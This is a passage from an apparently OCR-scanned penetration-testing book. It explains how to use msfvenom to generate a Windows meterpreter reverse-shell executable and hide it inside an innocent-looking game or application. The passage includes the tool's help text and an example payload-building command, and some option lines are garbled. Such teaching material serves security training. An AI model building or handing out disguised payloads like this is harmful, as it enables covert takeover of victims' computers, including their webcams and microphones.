msf5 > search type:exploit platform:windows tika Success!
We added a new module to Metasploit and its ready for our use!

**Creating a Malicious File with msfvenom Metasploit has a special function to create malicious files that contain the payload modules. In other words, this is how we might create a file that includes a windows executable (.exe) file that when --**
clicked and activated-- give us control of the target’s computer. Ideally, this payload is the meterpreter 166 | Page

```
```
root@kali-2010:~# msfvenom -h
msfvenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <varval>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
Options:
	-l, --list              <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
	-p, --payload           <payload>  Payload to use (use -l-list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom payload format (use -l-list formats to list)
	-f, --format            <format>   Output format (use -l-list formats to list)
	-e, --encoder           <encoder>  The encoder to use (use -l-list encoders to list)
	--sec-name              <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
	--smaller                     Generate the smallest possible payload using all available encoders
	--encrypt                 <value>    The type of encryption or encoding to apply to the shellcode (use -l-list encrypt to list)
	--encrypt-key             <value>    A key to be used for --encrypt
	--encrypt-iv              <value>    An initialization vector for --encrypt
	-a, --arch                <arch>     The architecture to use for --payload and --encoders (use -l-list archs to list)
	--platform                <platform>The platform for --payload (use -l-list platforms to list)
	-o, --out                 <path>     Save the payload to a file
	b, --bad-chars           <list>     Characters to avoid example: \x0a\xff
	-n, --nopsled           <length>     Prepend a nopsled of [length] size onto the payload
	--pad-nops                      Use nopsled size specified by -n -lengths as the total payload size, auto-prepending a nopsled of quantity (nop
	ngh)
	-s, --space                 <length>   The maximum size of the resulting payload
	-l, --iterations            <count>    The number of tries to encode the payload
	C, --add-code              <path>     Specify an additional unix shellcode file to include
	t, --template               <path>     Specify a custom executable file to use as a template
	-k, --keep                        Preserve the -template behavior and inject the payload as a new thread
	v, --var-name              <value>    Specify a custom variable name to use for certain output formats
	-t, --timeout               <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
	-h, --help                        Show this message
```
```

payload as it has maximum capability for post-exploitation capabilities (web cam, microphone, upload and download files). We'll do some post exploitation with the Meterpreter in Chapter 11.

In Metasploit this function is called msfvenom. Msfvenom enables you to embed a Metasploit payload into an otherwise innocent-looking file such as a game or application. When the target clicks on the file, the payload will trigger giving **you** the meterpreter prompt on **their**